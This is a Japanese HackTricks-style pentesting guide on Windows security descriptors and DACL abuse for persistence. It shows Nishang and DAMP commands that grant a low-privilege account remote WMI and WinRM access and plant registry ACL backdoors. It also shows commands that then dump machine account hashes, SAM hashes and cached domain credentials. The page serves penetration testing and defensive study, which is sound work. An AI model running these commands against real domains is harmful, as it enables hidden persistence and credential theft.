# セキュリティ記述子

{{#include ../../banners/hacktricks-training.md}}

## セキュリティ記述子

Windows のセキュリティ記述子には、所有者 SID、プライマリ グループ SID、アクセスを制御する随意 ACL（DACL）、および主に監査に使用されるシステム ACL（SACL）が含まれます。Security Descriptor Definition Language（SDDL）はテキスト表現であり、ACE 文字列は `ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid;` の形式です。<sup>[[1]](#references)[[4]](#references)</sup>

セキュリティ記述子には、セキュリティ保護可能なオブジェクトの所有者と、そのオブジェクトに対して特定の権限を許可または拒否されているプリンシパルが格納されます。攻撃者が DACL を変更できる場合、通常は管理者ロールを必要とする権限を、低権限のプリンシパルに付与できます。

このため、必要最小限に変更した記述子は persistence に有用です。アカウントを明らかな特権グループの外部に置いたまま、特定の管理インターフェースへのアクセスを維持できます。テスト前に元の記述子を保存し、変更を正確に削除できるようにしてください。

### WMI へのアクセス

ユーザーに **WMI をリモートで実行する** アクセスを、[**これを使用して**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1)<sup>[[2]](#references)</sup> 付与できます。
```bash
Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc -Namespace 'root\cimv2' -Verbose
Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc -Namespace 'root\cimv2' -Remove -Verbose # Remove
```
### WinRMへのアクセス

Nishangの`Set-RemotePSRemoting`関数を使用して、ユーザーにリモートPowerShell/WinRMエンドポイントへのアクセス権を付与します。<sup>[[2]](#references)</sup>
```bash
Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Verbose
Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Remove #Remove
```
### ハッシュへのリモートアクセス

DAMP は、後からマシンアカウントのハッシュ、ローカル SAM ハッシュ、キャッシュされたドメイン認証情報をリモートで取得できるレジストリ ACL バックドアを作成できます。これらの限定的な権限を、特にドメインコントローラーに対して、通常のアカウントに付与することで、特権グループに所属させることなく強力な永続化を実現できます。<sup>[[3]](#references)</sup>
```bash
# allows for the remote retrieval of a system's machine and local account hashes, as well as its domain cached credentials.
Add-RemoteRegBackdoor -ComputerName <remotehost> -Trustee student1 -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local machine account hash for the specified machine.
Get-RemoteMachineAccountHash -ComputerName <remotehost> -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local SAM account hashes for the specified machine.
Get-RemoteLocalAccountHash -ComputerName <remotehost> -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the domain cached credentials for the specified machine.
Get-RemoteCachedCredential -ComputerName <remotehost> -Verbose
```
[**Silver Tickets**](silver-ticket.md)を確認して、Domain Controllerのコンピューターアカウントのhashをどのように使用できるかを学びましょう。

## References

- [1] [Security Descriptor Definition Language - Microsoft Learn](https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-definition-language)
- [2] [nishang - Set-RemoteWMI.ps1](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1)
- [3] [DAMP - Discretionary ACL Modification Project](https://github.com/HarmJ0y/DAMP)
- [4] [Microsoft Learn — Security descriptor string format](https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-string-format)
{{#include ../../banners/hacktricks-training.md}}
